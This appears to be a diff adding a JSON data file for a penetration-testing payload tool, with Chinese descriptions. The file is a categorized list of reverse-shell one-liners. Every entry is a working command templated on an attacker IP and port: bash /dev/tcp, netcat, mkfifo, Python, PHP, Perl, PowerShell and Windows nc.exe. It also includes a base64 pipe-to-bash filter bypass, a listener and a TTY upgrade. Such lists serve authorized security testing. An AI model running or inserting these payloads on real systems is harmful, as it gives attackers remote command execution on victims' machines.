@@ -1,0 +1,140 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "反弹 Shell / 连接",
+  "categories": ["Bash 系", "Netcat 系", "脚本语言", "Windows", "编码与传输"],
+  "items": [
+    {
+      "id": "shell-bash-tcp",
+      "title": "Bash TCP 反弹",
+      "category": "Bash 系",
+      "code": "bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1",
+      "desc": "利用 Bash 内置 /dev/tcp 建立连接，需要目标 Bash 编译支持。",
+      "tags": ["shell", "bash", "reverse"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-bash-196",
+      "title": "Bash 196 反弹",
+      "category": "Bash 系",
+      "code": "0<&196;exec 196<>/dev/tcp/{{ip}}/{{port}}; sh <&196 >&196 2>&196",
+      "desc": "文件描述符写法，兼容部分受限 shell。",
+      "tags": ["shell", "bash", "reverse"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-nc-e",
+      "title": "Netcat -e 反弹",
+      "category": "Netcat 系",
+      "code": "nc -e /bin/bash {{ip}} {{port}}",
+      "desc": "需要 nc 支持 -e 参数，部分发行版已移除。",
+      "tags": ["shell", "nc", "reverse"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-nc-mkfifo",
+      "title": "Netcat + mkfifo",
+      "category": "Netcat 系",
+      "code": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ip}} {{port}} >/tmp/f",
+      "desc": "无 -e 参数时的经典替代方案。",
+      "tags": ["shell", "nc", "mkfifo"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-python",
+      "title": "Python 反弹",
+      "category": "脚本语言",
+      "code": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{ip}}\",{{port}}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "desc": "Python3 一行反弹，兼容性较好。",
+      "tags": ["shell", "python", "reverse"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-php",
+      "title": "PHP 反弹",
+      "category": "脚本语言",
+      "code": "php -r '$sock=fsockopen(\"{{ip}}\",{{port}});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
+      "desc": "PHP CLI 环境下的反弹写法，用 proc_open 把 socket 直接作为标准输入输出，需 fsockopen 与 proc_open 可用。",
+      "tags": ["shell", "php", "reverse"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-perl",
+      "title": "Perl 反弹",
+      "category": "脚本语言",
+      "code": "perl -e 'use Socket;$i=\"{{ip}}\";$p={{port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "desc": "Perl 环境常用写法，老系统上命中率较高。",
+      "tags": ["shell", "perl", "reverse"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-powershell",
+      "title": "PowerShell 反弹",
+      "category": "Windows",
+      "code": "$client = New-Object System.Net.Sockets.TCPClient('{{ip}}',{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+      "desc": "Windows PowerShell 交互式反弹，注意执行策略限制。",
+      "tags": ["shell", "powershell", "windows"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-windows-nc",
+      "title": "Windows nc 反弹",
+      "category": "Windows",
+      "code": "nc.exe -e cmd.exe {{ip}} {{port}}",
+      "desc": "需要上传 nc.exe，注意杀软拦截。",
+      "tags": ["shell", "windows", "nc"],
+      "vars": ["ip", "port"],
+      "risk": "danger",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "shell-base64-encode",
+      "title": "Base64 编码传输",
+      "category": "编码与传输",
+      "code": "echo '<base64 编码后的命令>' | base64 -d | bash",
+      "desc": "避免特殊字符被过滤，先把命令 Base64 编码再解码执行。",
+      "tags": ["shell", "encode", "bypass"],
+      "vars": [],
+      "risk": "danger",
+      "source": "通用手法"
+    },
+    {
+      "id": "shell-listener-nc",
+      "title": "本地监听",
+      "category": "编码与传输",
+      "code": "nc -lvnp {{port}}",
+      "desc": "在攻击机侧启动监听，接收反弹连接。",
+      "tags": ["shell", "listener", "nc"],
+      "vars": ["port"],
+      "risk": "danger",
+      "source": "通用手法"
+    },
+    {
+      "id": "shell-upgrade-tty",
+      "title": "升级交互式 TTY",
+      "category": "编码与传输",
+      "code": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+      "desc": "把简易 shell 升级为可交互 TTY，便于后续操作。",
+      "tags": ["shell", "tty", "upgrade"],
+      "vars": [],
+      "risk": "danger",
+      "source": "通用手法"
+    }
+  ]
+}
